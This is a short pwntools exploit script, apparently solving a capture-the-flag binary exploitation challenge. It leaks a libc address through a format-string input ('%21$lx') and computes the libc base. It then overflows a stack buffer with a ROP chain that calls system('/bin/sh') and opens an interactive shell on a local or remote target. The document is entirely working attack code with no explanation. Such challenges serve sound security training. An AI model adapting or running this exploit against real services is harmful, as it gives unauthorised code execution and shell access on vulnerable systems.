from pwn import *

context.arch = 'amd64'

TARGET = './chall'
libc = ELF('./libc.so.6')
HOST = '1'
PORT = 999

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# gdb.attach(p, "b *helper+97")
p.sendlineafter(b"> ", b"%21$lx")
p.recvuntil(b"So you tell me to ")
leak_libc = int(p.recvline().strip(), 16)
log.success(f"leak libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x29ca8
log.success(f"base libc: {hex(libc.address)}")

rop = ROP(libc)

offset = 0x50 + 8

gadget = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

log.success(f"gadget: {hex(gadget)}")
log.success(f"ret: {hex(ret)}")
log.success(f"binsh: {hex(binsh)}")
log.success(f"system: {hex(system)}")

payload = b"A"*offset
payload += p64(ret)
payload += p64(gadget)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b"> ", payload)

p.interactive()